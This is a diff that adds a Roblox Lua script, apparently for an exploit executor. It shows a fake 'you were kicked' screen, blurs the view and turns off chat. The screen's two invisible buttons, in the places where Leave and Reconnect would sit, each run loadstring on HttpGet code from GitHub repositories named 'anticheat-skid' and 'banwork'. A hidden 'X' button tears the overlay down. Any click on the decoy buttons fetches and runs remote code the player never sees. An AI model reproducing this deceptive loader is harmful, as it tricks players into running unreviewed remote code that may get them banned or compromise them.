@@ -1,0 +1,86 @@
+local Kicker = Instance.new("ScreenGui")
+local main = Instance.new("Frame")
+local kicked = Instance.new("ImageLabel")
+local lev = Instance.new("TextButton")
+local recon = Instance.new("TextButton")
+local dest = Instance.new("TextButton")
+local light = game.Lighting
+local chat = game.Players.LocalPlayer.PlayerGui.Chat
+
+Kicker.Name = "Kicker"
+Kicker.Parent = game.CoreGui
+Kicker.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+main.Name = "main"
+main.Parent = Kicker
+main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+main.BackgroundTransparency = 1.000
+main.Position = UDim2.new(-0.204705879, 0, -1.3292383, 0)
+main.Size = UDim2.new(0, 2000, 0, 2000)
+main.Visible = true
+main.Active = true
+
+kicked.Name = "kicked"
+kicked.Parent = Kicker
+kicked.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+kicked.BackgroundTransparency = 1.000
+kicked.Position = UDim2.new(0, 825, 0, 350)
+kicked.Size = UDim2.new(0, 343, 0, 187)
+kicked.Visible = true
+kicked.Active = true
+kicked.Image = "rbxassetid://9192818818"
+
+lev.Name = "lev"
+lev.Parent = kicked
+lev.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+lev.BackgroundTransparency = 1.000
+lev.Position = UDim2.new(0.0174927115, 0, 0.775401056, 0)
+lev.Size = UDim2.new(0, 159, 0, 31)
+lev.Font = Enum.Font.SourceSans
+lev.Text = ""
+lev.TextColor3 = Color3.fromRGB(0, 0, 0)
+lev.TextSize = 14.000
+
+recon.Name = "recon"
+recon.Parent = kicked
+recon.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+recon.BackgroundTransparency = 1.000
+recon.Position = UDim2.new(0.513119519, 0, 0.775401056, 0)
+recon.Size = UDim2.new(0, 161, 0, 31)
+recon.Font = Enum.Font.SourceSans
+recon.Text = ""
+recon.TextColor3 = Color3.fromRGB(0, 0, 0)
+recon.TextSize = 14.000
+
+dest.Name = "dest"
+dest.Parent = kicked
+dest.BackgroundColor3 = Color3.fromRGB(253, 141, 122)
+dest.BorderSizePixel = 0
+dest.Position = UDim2.new(0, 1000, 0, -380)
+dest.Size = UDim2.new(0, 26, 0, 24)
+dest.Font = Enum.Font.SourceSans
+dest.Text = "X"
+dest.TextColor3 = Color3.fromRGB(0, 0, 0)
+dest.TextSize = 14.000
+
+dest.MouseButton1Click:connect(function()
+    Kicker:Destroy()
+    chat.Enabled = true
+    light:Destroy()
+end)
+
+recon.MouseButton1Click:connect(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/OptioniaI/anticheat-skid/main/skiddss"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/OptioniaI/banwork/main/skid"))()
+end)
+
+lev.MouseButton1Click:connect(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/OptioniaI/anticheat-skid/main/skiddss"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/OptioniaI/banwork/main/skid"))()
+end)
+
+light = Instance.new("BlurEffect", light)
+light.Name = "Kick"
+light.Size = 26
+
+chat.Enabled = false
